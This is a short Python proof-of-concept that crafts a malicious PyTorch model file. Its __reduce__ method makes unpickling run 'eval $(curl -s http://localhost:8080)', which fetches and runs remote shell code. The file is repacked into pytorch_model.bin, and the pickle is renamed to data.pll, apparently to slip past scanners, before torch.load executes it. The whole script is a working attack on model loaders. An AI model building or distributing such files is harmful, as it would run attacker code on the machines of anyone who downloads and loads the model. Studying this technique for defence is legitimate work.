import os

import torch
class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)

andrew = RemoteCodeExecution()
# empty zero length file
torch.save(andrew, 'pytorch_model.zip')

import my_zipfile as zipfile

with zipfile.ZipFile('pytorch_model.zip', 'r') as z:
    print(z.namelist())
    with zipfile.ZipFile('pytorch_model.bin', 'w') as wz:
        for f in z.namelist():
            wz.writestr(f, z.read(f))

with zipfile.ZipFile('pytorch_model.bin', 'r') as z:
    print(z.namelist())



# # rename data.pkl to data.p in the pytorch_model.bin archive
# with open('pytorch_model.bin', 'rb') as f:
#     data = f.read()
#     data = data.replace(b'data.pkl', b'data.pll')
#     with open('pytorch_model.bin', 'wb') as f:
#         f.write(data)


andrew_from_file = torch.load('pytorch_model.bin', pickle_file = 'data.pll')

print(andrew_from_file)
